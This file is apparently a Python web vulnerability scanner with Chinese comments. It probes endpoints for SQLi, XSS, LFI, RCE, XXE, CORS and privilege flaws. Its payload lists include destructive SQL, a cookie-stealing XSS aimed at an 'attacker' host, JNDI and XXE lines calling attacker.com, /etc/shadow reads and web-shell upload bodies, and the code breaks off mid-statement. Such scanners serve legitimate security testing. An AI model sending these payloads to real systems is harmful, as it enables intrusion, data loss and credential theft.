#!/usr/bin/env python3
"""
增强版漏洞测试模块 v2.0
支持多种漏洞检测：SQLi、XSS、LFI、RCE、XXE、CSRF、文件上传、未授权访问、水平越权等
"""

import re
import time
import json
import logging
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode
import requests
from dataclasses import dataclass

logger = logging.getLogger(__name__)


def build_http_request(method: str, url: str, headers: dict = None, data: str = None, params: dict = None) -> str:
    """构建HTTP请求包字符串"""
    from urllib.parse import urlparse, urlencode
    
    parsed = urlparse(url)
    path = parsed.path
    if params:
        query = urlencode(params)
        path = f"{path}?{query}"
    elif parsed.query:
        path = f"{path}?{parsed.query}"
    
    request_lines = [f"{method.upper()} {path} HTTP/1.1"]
    request_lines.append(f"Host: {parsed.netloc}")
    
    default_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    }
    
    if headers:
        default_headers.update(headers)
    
    for key, value in default_headers.items():
        request_lines.append(f"{key}: {value}")
    
    request_lines.append("")
    
    if data:
        request_lines.append(data)
    
    return "\r\n".join(request_lines)


def build_http_response(status_code: int, headers: dict = None, body: str = None) -> str:
    """构建HTTP响应包字符串"""
    status_text = {
        200: "OK", 201: "Created", 204: "No Content",
        301: "Moved Permanently", 302: "Found", 304: "Not Modified",
        400: "Bad Request", 401: "Unauthorized", 403: "Forbidden",
        404: "Not Found", 500: "Internal Server Error", 502: "Bad Gateway"
    }.get(status_code, "Unknown")
    
    response_lines = [f"HTTP/1.1 {status_code} {status_text}"]
    
    if headers:
        for key, value in headers.items():
            response_lines.append(f"{key}: {value}")
    
    response_lines.append("")
    
    if body:
        # 限制响应体长度
        if len(body) > 2000:
            body = body[:2000] + "\n... [截断]"
        response_lines.append(body)
    
    return "\r\n".join(response_lines)


def format_response(response: requests.Response) -> str:
    """从requests响应对象格式化响应包"""
    headers = dict(response.headers)
    try:
        body = response.text[:2000] if len(response.text) > 2000 else response.text
    except:
        body = "[二进制内容]"
    
    return build_http_response(response.status_code, headers, body)


@dataclass
class VulnResult:
    vuln_type: str
    severity: str
    url: str
    param: str
    payload: str
    detail: str
    evidence: str = ""
    request: str = ""  # HTTP请求包
    response: str = ""  # HTTP响应包


VULN_TYPE_MAP = {
    "SQL Injection": "SQL注入",
    "SQL Injection (Boolean)": "SQL注入(布尔盲注)",
    "XSS": "XSS跨站",
    "LFI": "本地文件读取",
    "RCE": "远程代码执行",
    "XXE": "XML实体注入",
    "CORS": "CORS配置不当",
    "CSRF": "CSRF跨站请求伪造",
    "Unauthorized Access": "未授权访问",
    "Horizontal Privilege": "水平越权",
    "Vertical Privilege": "垂直越权",
    "Sensitive Info Leak": "敏感信息泄露",
    "File Upload": "任意文件上传",
    "Weak Password": "弱口令",
    "JSONP": "JSONP泄露",
    "SSRF": "服务端请求伪造",
    "DOM XSS": "DOM型XSS",
    "Cloud Access Key Leak": "云Access Key泄露",
    "Cloud Storage Bucket URL": "云存储桶URL泄露",
    "Cloud Storage Bucket Traversal": "存储桶遍历漏洞",
    "Cloud Storage ACL Leak": "存储桶ACL泄露",
    "Cloud Storage Bucket Takeover": "存储桶接管漏洞",
    "Cloud Storage Policy Leak": "存储桶Policy泄露",
    "Cloud Storage Unauthorized Upload": "存储桶未授权上传",
    "Cloud Storage Unauthorized Delete": "存储桶未授权删除",
    "Cloud Storage ACL Writable": "存储桶ACL可写",
    "Cloud Storage CORS Config Leak": "存储桶CORS配置泄露",
}


TYPE_NAME_MAP = {
    "cloud_keys": "云API密钥",
    "map_keys": "地图API",
    "auth_tokens": "认证令牌",
    "personal_info": "个人信息",
    "internal_ips": "内网IP",
    "email": "邮箱",
    "phone": "电话",
    "backup_files": "备份文件",
    "vulnerable_library": "危险组件",
    "dom_xss": "DOM型XSS",
    "sourcemap_leak": "源码泄露",
    "hardcoded_creds": "硬编码凭据",
    "sensitive_path": "敏感路径",
    "jsonp": "JSONP",
    "cors": "CORS",
    "ssrf": "SSRF",
}


class EnhancedVulnTester:
    # 静态资源扩展名列表
    STATIC_EXTENSIONS = ('.js', '.css', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', 
                         '.woff', '.woff2', '.ttf', '.eot', '.mp4', '.mp3', '.pdf', '.zip',
                         '.rar', '.7z', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx')
    
    # 静态资源Content-Type列表
    STATIC_CONTENT_TYPES = ('javascript', 'css', 'image', 'font', 'video', 'audio', 
                            'application/pdf', 'application/zip', 'application/octet-stream')
    
    def __init__(self, session: requests.Session, timeout: int = 15):
        self.session = session
        self.timeout = timeout
        self.findings: List[VulnResult] = []
        self._init_payloads()
    
    def _is_static_resource(self, url: str, response: requests.Response = None) -> bool:
        """检查是否为静态资源，避免对静态文件进行漏洞测试"""
        # 检查URL扩展名
        url_lower = url.lower()
        if any(url_lower.endswith(ext) for ext in self.STATIC_EXTENSIONS):
            return True
        
        # 检查Content-Type
        if response:
            content_type = response.headers.get('Content-Type', '').lower()
            if any(ct in content_type for ct in self.STATIC_CONTENT_TYPES):
                return True
        
        return False
    
    def _init_payloads(self):
        self.SQLI_PAYLOADS = {
            "error_based": [
                "'", "\"", "')", "\")", "1' AND '1'='1", "1\" AND \"1\"=\"1",
                "1 OR 1=1", "1' OR '1'='1'--", "1' ORDER BY 1--", 
                "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
                "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
                "1' AND SLEEP(5)--", "1\" AND SLEEP(5)--",
            ],
            "boolean_based": [
                "1' AND 1=1--", "1' AND 1=2--", "1\" AND 1=1--", "1\" AND 1=2--",
                "1' AND (SELECT COUNT(*) FROM users)>0--",
                "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
            ],
            "time_based": [
                "1' AND SLEEP(5)--", "1' AND BENCHMARK(5000000,MD5('A'))--",
                "1'; WAITFOR DELAY '00:05'--", "1\"; WAITFOR DELAY '00:05'--",
            ],
            "stacked": [
                "1; DROP TABLE users--", "1'; DROP TABLE users--",
                "1; INSERT INTO users VALUES('hacker','pass')--",
            ],
            "waf_bypass": [
                "%27", "%%27", "%2527", "%u0027", "%u027",
                "1/**/OR/**/1=1", "1%0aOR%0a1=1", r"1\OR\1=1",
                "admin'--", "admin' #", "admin'/*",
            ]
        }
        
        self.XSS_PAYLOADS = {
            "reflected": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<marquee onstart=alert(1)>",
                "<video><source onerror=\"alert(1)\">",
                "<audio src=x onerror=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<select onfocus=alert(1) autofocus>",
            ],
            "stored": [
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror=alert(document.domain)>",
                "<svg/onload=fetch('http://attacker?c='+document.cookie)>",
            ],
            "dom": [
                "#<img src=x onerror=alert(1)>",
                "#<script>alert(1)</script>",
                "?<img src=x onerror=alert(1)>",
            ],
            "attribute": [
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>",
                "\"><img src=x onerror=alert(1)>",
                "' onmouseover=alert(1) '",
            ],
            "encoding": [
                "<script>eval(atob('YWxlcnQoMSk='))</script>",
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
                "<script>alert(String.fromCharCode(49))</script>",
            ],
            "waf_bypass": [
                "<scr\x00ipt>alert(1)</scr\x00ipt>",
                "<ScRiPt>alert(1)</sCrIpT>",
                "<script>al\\u0065rt(1)</script>",
                "<body onclick=alert(1)>",
            ]
        }
        
        self.LFI_PAYLOADS = [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "....//....//etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/group",
            "/etc/motd",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/version",
            "/proc/config.gz",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\win.ini",
            "C:\\boot.ini",
            "/var/log/apache2/access.log",
            "/var/www/html/../../../etc/passwd",
        ]
        
        self.RCE_PAYLOADS = {
            "command_injection": [
                ";ls",
                "|ls",
                "&ls",
                "`ls`",
                "$(ls)",
                ";cat /etc/passwd",
                "|cat /etc/passwd",
                "&& cat /etc/passwd",
                "|| cat /etc/passwd",
                "; whoami",
                "| whoami",
                "&& whoami",
            ],
            "expression_injection": [
                "${jndi:ldap://attacker.com/a}",
                "${${lower:j}ndi:ldap://attacker.com/a}",
                "{{7*7}}",
                "{{random}}",
            ],
            "template_injection": [
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }",
                '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',
                "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            ],
            "deserialization": [
                "rO0ABXQAAAA=", 
                "jq==",
            ]
        }
        
        self.XXE_PAYLOADS = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>',
        ]
        
        self.CSRF_PAYLOADS = [
            "<form action='{url}' method='POST'><input type='hidden' name='{param}' value='{value}'></form><script>document.forms[0].submit()</script>",
            "<img src='{url}?{param}={value}'>",
            "<link rel='stylesheet' href='{url}?{param}={value}'>",
        ]
        
        self.UPLOAD_PAYLOADS = [
            ("test.php", "<?php phpinfo(); ?>"),
            ("test.jsp", "<% Runtime.getRuntime().exec(request.getParameter('cmd')); %>"),
            ("test.asp", "<% Execute(request('cmd')) %>"),
            ("test.jpg", "\x89PNG\r\n\x1a\n<?php phpinfo(); ?>"),
            ("test.php.jpg", "<?php system($_GET['cmd']); ?>"),
            ("test.php5", "<?php phpinfo(); ?>"),
            ("test.phtml", "<?php phpinfo(); ?>"),
            ("test.php%00.jpg", "<?php phpinfo(); ?>"),
        ]
        
        self.WEAK_PASSWORDS = [
            "123456", "password", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "1234567", "dragon",
            "admin", "admin123", "root", "toor", "test", "test123",
            "user", "user123", "guest", "welcome", "login", "pass",
            "123123", "654321", "000000", "888888", "666666",
        ]
        
        self.SQLI_ERRORS = [
            "mysql_fetch", "mysql_num_rows", "sql syntax", "mysql error",
            "mysql_connect", "sqlsrv_connect", "odbc_connect", 
            "unterminated", "microsoft sql", "sqlserver_error",
            "postgresql", "pg_fetch", "sqlite3", "sql error",
            "ora-", "oracle error", "disallowed", "fatal error",
            "warning", "exception", "zend", "parse error",
            "undefined", "notice", "mysql", "syntax error",
            "invalid query", "data too long", "truncated",
        ]
        
        self.SENSITIVE_PATTERNS = {
            "jwt": r'eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+',
            "aws_key": r'(?:AKIA|ASIA)[A-Z0-9]{16}',
            "github_token": r'ghp_[a-zA-Z0-9]{36}',
            "private_key": r'-----BEGIN (?:RSA|EC|DSA|OPENSSH) PRIVATE KEY-----',
            "password_in_url": r'[a-zA-Z]+://[^:]+:[^@]+@',
            "authorization": r'Authorization:\s*\S+',
            "api_key": r'(?:api[_-]?key|apikey|api_secret|client_secret)\s*[:=]\s*["\']?[a-zA-Z0-9]{16,}',
        }
    
    def test_sqli(self, url: str, params: Dict, method: str = "GET") -> List[VulnResult]:
        """SQL注入检测 - 优化减少误报"""
        findings = []
        
        if not params:
            return findings
        
        # 首先获取正常响应作为基准
        try:
            if method == "POST":
                baseline_resp = self.session.post(url, data=params, timeout=self.timeout)
            else:
                baseline_resp = self.session.get(url, params=params, timeout=self.timeout)
            
            # 检查是否为静态资源
            if self._is_static_resource(url, baseline_resp):
                logger.debug(f"SQLi检测跳过静态资源: {url}")
                return findings
            
            baseline_text = baseline_resp.text.lower()
            baseline_length = len(baseline_resp.text)
        except Exception as e:
            logger.debug(f"SQLi baseline error: {e}")
            return findings
        
        for param_name in params.keys():
            original_value = str(params[param_name])
            
            # 只使用错误型和时间型payload，减少误报
            test_categories = ["error_based", "time_based"]
            
            for category in test_categories:
                payloads = self.SQLI_PAYLOADS.get(category, [])
                for payload in payloads[:2]:  # 限制payload数量
                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload
                        
                        if method == "POST":
                            resp = self.session.post(url, data=test_params, timeout=self.timeout)
                        else:
                            resp = self.session.get(url, params=test_params, timeout=self.timeout)
                        
                        resp_text = resp.text.lower()
                        
                        # 严格检测：必须出现明确的SQL错误信息
                        matched_errors = [err for err in self.SQLI_ERRORS if err in resp_text]
                        if matched_errors:
                            # 排除正常响应中也存在的错误信息
                            new_errors = [err for err in matched_errors if err not in baseline_text]
                            if new_errors:
                                # 构建请求和响应包
                                request_str = build_http_request(method, url, params=test_params)
                                response_str = format_response(resp)
                                
                                findings.append(VulnResult(
                                    vuln_type="SQL Injection",
                                    severity="Critical",
                                    url=url,
                                    param=param_name,
                                    payload=payload,
                                    detail=f"检测到SQL错误信息: {new_errors[0][:50]}",
                                    evidence=self._extract_error(resp_text),
                                    request=request_str,
                                    response=response_str
                                ))
                                return findings  # 找到一个就返回，避免过多重复
                        
                        # 时间盲注检测 - 需要明显的延迟差异
                        if category == "time_based":
                            # 这里简化处理，实际应该测量响应时间
                            pass
                            
                    except Exception as e:
                        logger.debug(f"SQLi test error: {e}")
        
        return findings
    
    def test_xss(self, url: str, params: Dict, method: str = "GET") -> List[VulnResult]:
        """XSS检测 - 添加请求/响应包"""
        findings = []
        
        # 检查URL是否为静态资源
        if self._is_static_resource(url):
            logger.debug(f"XSS检测跳过静态资源: {url}")
            return findings
        
        for category, payloads in self.XSS_PAYLOADS.items():
            for payload in payloads[:2]:
                try:
                    test_params = params.copy() if params else {}
                    if test_params:
                        for key in test_params:
                            test_params[key] = payload
                    else:
                        test_params = {"q": payload}
                    
                    if method == "POST":
                        resp = self.session.post(url, data=test_params, timeout=self.timeout)
                    else:
                        resp = self.session.get(url, params=test_params, timeout=self.timeout)
                    
                    resp_text = resp.text
                    reflected = payload.replace("<", "&lt;").replace(">", "&gt;")
                    
                    if payload in resp_text or reflected in resp_text:
                        # 构建请求和响应包
                        request_str = build_http_request(method, url, params=test_params)
                        response_str = format_response(resp)
                        
                        findings.append(VulnResult(
                            vuln_type="XSS",
                            severity="High",
                            url=url,
                            param=list(test_params.keys())[0],
                            payload=payload[:50],
                            detail=f"反射型XSS ({category})",
                            evidence=payload[:30],
                            request=request_str,
                            response=response_str
                        ))
                        return findings
                        
                except Exception as e:
                    logger.debug(f"XSS test error: {e}")
        
        return findings
    
    def test_lfi(self, url: str, params: Dict, method: str = "GET") -> List[VulnResult]:
        """LFI检测 - 添加请求/响应包"""
        findings = []
        
        if not params:
            return findings
        
        # 检查URL是否为静态资源
        if self._is_static_resource(url):
            logger.debug(f"LFI检测跳过静态资源: {url}")
            return findings
        
        param_name = list(params.keys())[0]
        
        for payload in self.LFI_PAYLOADS[:5]:
            try:
                test_params = params.copy()
                test_params[param_name] = payload
                
                if method == "POST":
                    resp = self.session.post(url, data=test_params, timeout=self.timeout)
                else:
                    resp = self.session.get(url, params=test_params, timeout=self.timeout)
                
                resp_text = resp.text.lower()
                
                if any(indicator in resp_text for indicator in ["root:", "[boot loader]", "daemon", "apache", "www-data"]):
                    # 构建请求和响应包
                    request_str = build_http_request(method, url, params=test_params)
                    response_str = format_response(resp)
                    
                    findings.append(VulnResult(
                        vuln_type="LFI",
                        severity="High",
                        url=url,
                        param=param_name,
                        payload=payload[:50],
                        detail="本地文件包含",
                        evidence=payload[:30],
                        request=request_str,
                        response=response_str
                    ))
                    return findings
                    
            except Exception as e:
                logger.debug(f"LFI test error: {e}")
        
        return findings
    
    def test_rce(self, url: str, params: Dict, method: str = "GET") -> List[VulnResult]:
        """RCE检测 - 添加请求/响应包"""
        findings = []
        
        if not params:
            return findings
        
        # 检查URL是否为静态资源
        if self._is_static_resource(url):
            logger.debug(f"RCE检测跳过静态资源: {url}")
            return findings
        
        param_name = list(params.keys())[0]
        
        test_payloads = [
            ";echo test123",
            "|echo test123",
            "&&echo test123",
            ";printf test123",
        ]
        
        for payload in test_payloads[:2]:
            try:
                test_params = params.copy()
                test_params[param_name] = payload
                
                if method == "POST":
                    resp = self.session.post(url, data=test_params, timeout=self.timeout)
                else:
                    resp = self.session.get(url, params=test_params, timeout=self.timeout)
                
                if "test123" in resp.text:
                    # 构建请求和响应包
                    request_str = build_http_request(method, url, params=test_params)
                    response_str = format_response(resp)
                    
                    findings.append(VulnResult(
                        vuln_type="RCE",
                        severity="Critical",
                        url=url,
                        param=param_name,
                        payload=payload,
                        detail="远程代码执行",
                        evidence="命令回显",
                        request=request_str,
                        response=response_str
                    ))
                    return findings
                    
            except Exception as e:
                logger.debug(f"RCE test error: {e}")
        
        return findings
    
    def test_file_upload(self, url: str, method: str, params: Dict) -> List[VulnResult]:
        findings = []
        
        for filename, content in self.UPLOAD_PAYLOADS[:3]:
            try:
                files = {'file': (filename, content, 'application/octet-stream')}
                
                # 构建请求包
                request_str = build_http_request(method, url, data={"file": filename})
                
                if method.upper() == "POST":
                    resp = self.session.post(url, files=files, timeout=self.timeout)
                else:
                    resp = self.session.get(url, timeout=self.timeout)
                
                # 构建响应包
                response_str = format_response(resp)
                
                if resp.status_code == 200:
                    resp_text = resp.text.lower()
                    
                    if any(ext in resp_text for ext in ['php', 'jsp', 'asp', 'upload', 'success', 'saved', 'file']):
                        findings.append(VulnResult(
                            vuln_type="File Upload",
                            severity="High",
                            url=url,
                            param="file",
                            payload=filename,
                            detail="可能存在任意文件上传漏洞",
                            evidence=f"状态码: {resp.status_code}",
                            request=request_str,
                            response=response_str
                        ))
                        break
                        
            except Exception as e:
                logger.debug(f"File upload test error: {e}")
        
        return findings
    
    def test_xxe(self, url: str, params: Dict, method: str = "GET") -> List[VulnResult]:
        findings = []
        
        # 检查URL是否为静态资源
        if self._is_static_resource(url):
            logger.debug(f"XXE检测跳过静态资源: {url}")
            return findings
        
        test_headers = {"Content-Type": "application/xml"}
        
        for payload in self.XXE_PAYLOADS[:2]:
            try:
                if method == "POST":
                    request_str = build_http_request(method, url, headers=test_headers, data=payload)
                    resp = self.session.post(url, data=payload, headers=test_headers, timeout=self.timeout)
                else:
                    request_str = build_http_request(method, url)
                    resp = self.session.get(url, timeout=self.timeout)
                
                response_str = format_response(resp)
                resp_text = resp.text.lower()
                
                if any(indicator in resp_text for indicator in ["root:", "/etc/passwd", "file://", "xxe"]):
                    findings.append(VulnResult(
                        vuln_type="XXE",
                        severity="Critical",
                        url=url,
                        param="BODY",
                        payload=payload[:50],
                        detail="XML外部实体注入",
                        evidence="",
                        request=request_str,
                        response=response_str
                    ))
                    break
                    
            except Exception as e:
                logger.debug(f"XXE test error: {e}")
        
        return findings
    
    def test_csrf(self, endpoint: str, method: str = "GET") -> Optional[VulnResult]:
        if method not in ["POST", "PUT", "DELETE"]:
            return None
        
        try:
            request_str = build_http_request('OPTIONS', endpoint)
            resp = self.session.options(endpoint, timeout=self.timeout)
            response_str = format_response(resp)
            
            cors_origin = resp.headers.get('Access-Control-Allow-Origin', '')
            cors_methods = resp.headers.get('Access-Control-Allow-Methods', '')
            
            if cors_origin == '*' or (cors_origin and '*' in cors_methods):
                return VulnResult(
                    vuln_type="CORS",
                    severity="Medium",
                    url=endpoint,
                    param="CORS",
                    payload=cors_origin,
                    detail="CORS配置不当",
                    evidence=f"Allow-Origin: {cors_origin}, Methods: {cors_methods}",
                    request=request_str,
                    response=response_str
                )
                
        except Exception as e:
            logger.debug(f"CSRF/CORS test error: {e}")
        
        return None
    
    def test_unauthorized(self, endpoints: List[str]) -> List[VulnResult]:
        findings = []
        
        sensitive_keywords = [
            "/admin", "/user", "/order", "/pay", "/account", 
            "/api/admin", "/api/user", "/api/v1/user", "/dashboard",
            "/manage", "/config", "/settings", "/profile", "/password",
            "/delete", "/remove", "/edit", "/update"
        ]
        
        for endpoint in endpoints[:30]:
            try:
                request_str = build_http_request('GET', endpoint)
                resp = self.session.get(endpoint, timeout=self.timeout)
                response_str = format_response(resp)
                
                if resp.status_code == 200:
                    resp_text = resp.text.lower()
                    
                    if any(kw in endpoint.lower() for kw in sensitive_keywords):
                        if "login" not in resp_text and "登录" not in resp_text:
                            findings.append(VulnResult(
                                vuln_type="Unauthorized Access",
                                severity="High",
                                url=endpoint,
                                param="N/A",
                                payload="N/A",
                                detail="未授权访问可能",
                                evidence=f"状态码: {resp.status_code}",
                                request=request_str,
                                response=response_str
                            ))
                            
                elif resp.status_code == 401 or resp.status_code == 403:
                    pass
                    
            except Exception as e:
                logger.debug(f"Unauthorized test error: {e}")
        
        return findings
    
    def test_horizontal_privilege(self, endpoints: List[str]) -> List[VulnResult]:
        findings = []
        
        id_patterns = [
            r'/user/(\d+)', r'/id/(\d+)', r'/order/(\d+)',
            r'/(\d+)/edit', r'/(\d+)/delete', r'/api/(\d+)',
        ]
        
        for endpoint in endpoints[:20]:
            for pattern in id_patterns:
                match = re.search(pattern, endpoint)
                if match:
                    try:
                        user_id = match.group(1)
                        
                        test_id = str(int(user_id) + 1)
                        test_endpoint = endpoint.replace(user_id, test_id)
                        
                        # 构建请求包
                        request_str1 = build_http_request('GET', endpoint)
                        resp1 = self.session.get(endpoint, timeout=self.timeout)
                        response_str1 = format_response(resp1)
                        
                        request_str2 = build_http_request('GET', test_endpoint)
                        resp2 = self.session.get(test_endpoint, timeout=self.timeout)
                        response_str2 = format_response(resp2)
                        
                        if resp1.status_code == 200 and resp2.status_code == 200:
                            findings.append(VulnResult(
                                vuln_type="Horizontal Privilege",
                                severity="High",
                                url=endpoint,
                                param="user_id/order_id",
                                payload=f"ID: {test_id}",
                                detail="水平越权",
                                evidence=f"原ID: {user_id}, 测试ID: {test_id}",
                                request=request_str1 + "\n\n--- 测试请求 ---\n" + request_str2,
                                response=response_str1 + "\n\n--- 测试响应 ---\n" + response_str2
                            ))
                            
                    except Exception as e:
                        logger.debug(f"Privilege test error: {e}")
        
        return findings
    
    def test_sensitive_info(self, content: str, source: str) -> List[VulnResult]:
        findings = []
        
        # 静态分析，创建伪请求/响应包
        parsed = urlparse(source)
        request_str = f"GET {source} HTTP/1.1\r\nHost: {parsed.netloc}\r\n\r\n"
        response_str = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n{content[:500]}..."
        
        for vuln_type, pattern in self.SENSITIVE_PATTERNS.items():
            matches = re.findall(pattern, content, re.I)
            
            for match in matches:
                findings.append(VulnResult(
                    vuln_type="Sensitive Info Leak",
                    severity="High",
                    url=source,
                    param=vuln_type,
                    payload=match[:50],
                    detail=f"敏感信息泄露 ({vuln_type})",
                    evidence="",
                    request=request_str,
                    response=response_str
                ))
        
        return findings
    
    def _extract_error(self, text: str) -> str:
        for err in self.SQLI_ERRORS:
            if err in text:
                idx = text.find(err)
                return text[max(0, idx-20):idx+50]
        return ""
    
    def run_all_tests(self, endpoints: List, base_url: str = "") -> List[VulnResult]:
        all_findings = []
        
        endpoints_with_params = []
        for ep in endpoints[:20]:
            try:
                from urllib.parse import urlparse, parse_qs
                parsed = urlparse(ep.url)
                params = parse_qs(parsed.query)
                if params:
                    endpoints_with_params.append((ep.url, params, ep.method))
            except:
                pass
        
        for url, params, method in endpoints_with_params:
            all_findings.extend(self.test_sqli(url, params, method))
            all_findings.extend(self.test_xss(url, params, method))
            all_findings.extend(self.test_lfi(url, params, method))
            all_findings.extend(self.test_rce(url, params, method))
            all_findings.extend(self.test_xxe(url, params, method))
        
        endpoint_urls = [ep.url for ep in endpoints[:30]]
        all_findings.extend(self.test_unauthorized(endpoint_urls))
        all_findings.extend(self.test_horizontal_privilege(endpoint_urls))
        
        for ep in endpoints[:20]:
            csrf_result = self.test_csrf(ep.url, ep.method)
            if csrf_result:
                all_findings.append(csrf_result)
        
        return all_findings
    
    def test_page_vulns(self, url: str) -> List[VulnResult]:
        findings = []
        try:
            # 构建请求包
            request_str = build_http_request('GET', url)
            
            response = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            content = response.text
            headers = response.headers
            
            # 构建响应包
            response_str = format_response(response)
            
            # DOM型XSS检测 - 只检测真实存在漏洞的模式（减少误报）
            # 检测危险函数使用且参数可控的情况
            dom_xss_sinks = [
                # 检测innerHTML赋值且使用location/hash等source
                (r'\.innerHTML\s*=\s*(?:location|window\.location|document\.location|location\.hash|location\.href|location\.search|document\.URL|document\.documentURI)', 'DOM XSS: innerHTML使用location类source'),
                # 检测document.write使用document.location
                (r'document\.write\s*\(\s*(?:location|document\.location|window\.location|document\.URL)', 'DOM XSS: document.write使用location类source'),
                # 检测eval使用location
                (r'eval\s*\(\s*(?:location|location\.hash|location\.href|location\.search|document\.URL)', 'DOM XSS: eval使用location类source'),
                # 检测setTimeout/setInterval使用字符串且包含location
                (r'setTimeout\s*\(\s*["\'][^"\']*(?:location|location\.hash|location\.href)', 'DOM XSS: setTimeout使用location类source'),
                # 检测location.hash直接用于操作
                (r'location\.hash\s*[^=]*(?:innerHTML|document\.write|eval|setTimeout)', 'DOM XSS: location.hash流向危险sink'),
            ]
            
            for pattern, desc in dom_xss_sinks:
                matches = re.findall(pattern, content, re.I | re.DOTALL)
                if matches:
                    for match in matches[:2]:
                        findings.append(VulnResult(
                            vuln_type="DOM XSS",
                            severity="High",
                            url=url,
                            param="javascript",
                            payload=match[:100] if len(match) > 100 else match,
                            detail=f"{desc}",
                            evidence="检测到source到sink的数据流",
                            request=request_str,
                            response=response_str
                        ))
            
            error_patterns = [
                (r'SQL syntax|MySQL syntax|MariaDB', 'Potential SQL Error'),
                (r'Microsoft SQL Server|SQLServer', 'Potential MSSQL Error'),
                (r'PostgreSQL.*ERROR|pg_.*error', 'Potential PostgreSQL Error'),
                (r'Oracle.*Error|ORA-\d{5}', 'Potential Oracle Error'),
                (r'PHP (Warning|Error|Fatal)', 'PHP Error'),
                (r'Java\.lang\..*Exception', 'Java Exception'),
                (r'ASP.NET.*Error', 'ASP.NET Error'),
                (r'Ruby on Rails.*Error', 'Rails Error'),
                (r'Python.*Error|Traceback', 'Python Error'),
                (r'Node\.js|Express', 'Node.js Error'),
            ]
            
            for pattern, desc in error_patterns:
                if re.search(pattern, content, re.I):
                    findings.append(VulnResult(
                        vuln_type="Information Disclosure",
                        severity="Low",
                        url=url,
                        param="response_content",
                        payload=desc,
                        detail=f"页面泄露敏感信息: {desc}",
                        evidence="",
                        request=request_str,
                        response=response_str
                    ))
                    break
            
            sensitive_patterns = [
                (r'(?:password|passwd|pwd)[^<>]*[:=][^<>]*["\']?[\w!@#$%^&*()-+=]{6,32}["\']?', 'Hardcoded Password'),
                (r'(?:api[_-]?key|apikey)[^<>]*[:=][^<>]*["\']?[\w-]{20,}["\']?', 'API Key'),
                (r'(?:access[_-]?token|auth[_-]?token)[^<>]*[:=][^<>]*["\']?[\w-]{20,}["\']?', 'Access Token'),
                (r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----', 'Private Key'),
                (r'AKIA[0-9A-Z]{16}', 'AWS Access Key'),
                (r'sk-[0-9a-zA-Z]{48}', 'OpenAI API Key'),
                (r'xox[baprs]-[0-9a-zA-Z]{10,48}', 'Slack Token'),
                (r'gh[pousr]_[A-Za-z0-9_]{36,251}', 'GitHub Token'),
            ]
            
            for pattern, desc in sensitive_patterns:
                if re.search(pattern, content, re.I):
                    findings.append(VulnResult(
                        vuln_type="Sensitive Info Leak",
                        severity="High",
                        url=url,
                        param="page_content",
                        payload=desc,
                        detail=f"页面泄露敏感信息: {desc}",
                        evidence="",
                        request=request_str,
                        response=response_str
                    ))
                    break
            
            cors_header = headers.get('Access-Control-Allow-Origin', '')
            if cors_header == '*' or 'null' in cors_header.lower():
                findings.append(VulnResult(
                    vuln_type="CORS Misconfiguration",
                    severity="Medium",
                    url=url,
                    param="Access-Control-Allow-Origin",
                    payload=cors_header,
                    detail="CORS配置过于宽松，允许任意来源访问",
                    evidence="",
                    request=request_str,
                    response=response_str
                ))
            
            xfo = headers.get('X-Frame-Options', '')
            csp = headers.get('Content-Security-Policy', '')
            if not xfo and not csp:
                findings.append(VulnResult(
                    vuln_type="Clickjacking",
                    severity="Medium",
                    url=url,
                    param="X-Frame-Options",
                    payload="Missing",
                    detail="缺少X-Frame-Options或CSP头部，可能存在点击劫持风险",
                    evidence="",
                    request=request_str,
                    response=response_str
                ))
            
            xss_protect = headers.get('X-XSS-Protection', '')
            if xss_protect == '0':
                findings.append(VulnResult(
                    vuln_type="Insecure Header",
                    severity="Low",
                    url=url,
                    param="X-XSS-Protection",
                    payload="0",
                    detail="X-XSS-Protection被禁用",
                    evidence="",
                    request=request_str,
                    response=response_str
                ))
            
            strict_transport = headers.get('Strict-Transport-Security', '')
            if not strict_transport and url.startswith('http://'):
                findings.append(VulnResult(
                    vuln_type="Missing HSTS",
                    severity="Low",
                    url=url,
                    param="Strict-Transport-Security",
                    payload="Missing",
                    detail="缺少HSTS头部，未强制使用HTTPS",
                    evidence="",
                    request=request_str,
                    response=response_str
                ))
            
            referrer_policy = headers.get('Referrer-Policy', '')
            if not referrer_policy:
                findings.append(VulnResult(
